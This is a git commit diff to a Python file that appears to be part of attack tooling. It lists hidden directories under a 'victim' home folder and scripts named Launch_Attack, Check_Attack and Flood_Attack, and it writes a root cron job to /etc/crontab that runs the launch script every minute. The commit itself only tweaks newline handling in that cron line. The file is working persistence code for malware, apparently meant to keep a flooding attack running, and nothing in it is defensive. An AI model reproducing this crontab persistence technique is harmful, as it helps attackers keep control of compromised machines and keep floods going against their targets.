6f0be1420f7e422f66e3dd1a55ec9d4627023c61
Hank Kuo <hank@Hankde-MacBook-Pro.local>
2019-04-30 00:40:22 +0800

    update \n command

--- b.py
+++ b.py
@@ -2,7 +2,7 @@ import os
 
 attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)\n#'
+attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)\n#\n '
 
 
 def check_attack():
@@ -38,7 +38,6 @@ def set_up_crontab():
     crontab = open('/etc/crontab', 'a')
 
     crontab.write(attackCommand)
-    crontab.write('\n')
     crontab.close()
 
 
